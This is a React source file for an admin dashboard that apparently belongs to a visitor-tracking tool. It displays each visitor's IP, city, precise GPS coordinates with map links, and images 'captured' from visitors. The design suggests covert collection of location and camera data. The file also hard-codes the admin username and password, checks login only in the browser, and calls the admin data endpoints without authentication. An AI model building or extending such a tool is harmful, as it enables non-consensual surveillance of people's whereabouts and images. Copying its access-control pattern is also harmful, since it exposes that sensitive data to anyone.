import React, { useState } from 'react';
import axios from 'axios';
import { API_BASE_URL } from '../App';
import './AdminDashboard.css';

interface UserData {
  _id: string;
  accurateLocation?: {
    lat: number;
    lng: number;
    accurateLocation: string;
  };
  ipLocation: {
    ip: string;
    city: string;
    lat: number;
    lng: number;
    location: string;
  };
  createdAt: string;
  updatedAt: string;
}

interface ImageData {
  id: string;
  ip: string;
  imageData: string;
  capturedAt: string;
}

const AdminDashboard: React.FC = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [activeTab, setActiveTab] = useState<'users' | 'images'>('users');
  const [users, setUsers] = useState<UserData[]>([]);
  const [images, setImages] = useState<ImageData[]>([]);
  const [loading, setLoading] = useState(false);

  const ADMIN_USERNAME = 'monir';
  const ADMIN_PASSWORD = 'monir';

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      setIsLoggedIn(true);
      setLoginError('');
      fetchAllData();
    } else {
      setLoginError('Invalid username or password');
    }
  };

  const fetchAllData = async () => {
    setLoading(true);
    try {
      const [usersRes, imagesRes] = await Promise.all([
        axios.get(`${API_BASE_URL}/api/admin/users`),
        axios.get(`${API_BASE_URL}/api/admin/images`)
      ]);

      setUsers(usersRes.data.users);
      setImages(imagesRes.data.images);
    } catch (err) {
      console.error('Error fetching data:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setUsername('');
    setPassword('');
    setUsers([]);
    setImages([]);
  };

  if (!isLoggedIn) {
    return (
      <div className="admin-login-container">
        <div className="login-box">
          <h1>Admin Dashboard</h1>
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label>Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter username"
              />
            </div>
            <div className="form-group">
              <label>Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter password"
              />
            </div>
            {loginError && <p className="error-message">{loginError}</p>}
            <button type="submit" className="login-btn">
              Login
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-dashboard">
      <header className="admin-header">
        <h1>Admin Dashboard</h1>
        <button onClick={handleLogout} className="logout-btn">
          Logout
        </button>
      </header>

      <div className="tabs">
        <button
          className={`tab-btn ${activeTab === 'users' ? 'active' : ''}`}
          onClick={() => setActiveTab('users')}
        >
          Users ({users.length})
        </button>
        <button
          className={`tab-btn ${activeTab === 'images' ? 'active' : ''}`}
          onClick={() => setActiveTab('images')}
        >
          Images ({images.length})
        </button>
      </div>

      <div className="tab-content">
        {loading ? (
          <div className="loading">Loading data...</div>
        ) : activeTab === 'users' ? (
          <div className="users-grid">
            {users.length > 0 ? (
              users.map((user) => (
                <div key={user._id} className="user-card">
                  <h3>IP: {user.ipLocation.ip}</h3>
                  <div className="user-info">
                    <p>
                      <strong>City:</strong> {user.ipLocation.city}
                    </p>
                    <p>
                      <strong>IP Latitude:</strong> {user.ipLocation.lat.toFixed(4)}
                    </p>
                    <p>
                      <strong>IP Longitude:</strong> {user.ipLocation.lng.toFixed(4)}
                    </p>
                    {user.accurateLocation && (
                      <>
                        <p>
                          <strong>Accurate Latitude:</strong> {user.accurateLocation.lat.toFixed(4)}
                        </p>
                        <p>
                          <strong>Accurate Longitude:</strong> {user.accurateLocation.lng.toFixed(4)}
                        </p>
                        <p>
                          <a href={user.accurateLocation.accurateLocation} target="_blank" rel="noopener noreferrer" className="map-link">
                            View Accurate Location
                          </a>
                        </p>
                      </>
                    )}
                    <p>
                      <a href={user.ipLocation.location} target="_blank" rel="noopener noreferrer" className="map-link">
                        View IP Location
                      </a>
                    </p>
                    <p className="timestamp">
                      <strong>Created:</strong> {new Date(user.createdAt).toLocaleString()}
                    </p>
                    <p className="timestamp">
                      <strong>Updated:</strong> {new Date(user.updatedAt).toLocaleString()}
                    </p>
                  </div>
                </div>
              ))
            ) : (
              <div className="no-data">No users found</div>
            )}
          </div>
        ) : (
          <div className="images-grid">
            {images.length > 0 ? (
              images.map((image) => (
                <div key={image.id} className="image-card">
                  <img src={image.imageData} alt="Captured" className="thumbnail" />
                  <div className="image-info">
                    <p>
                      <strong>IP:</strong> {image.ip}
                    </p>
                    <p className="timestamp">
                      {new Date(image.capturedAt).toLocaleString()}
                    </p>
                  </div>
                </div>
              ))
            ) : (
              <div className="no-data">No images found</div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminDashboard;
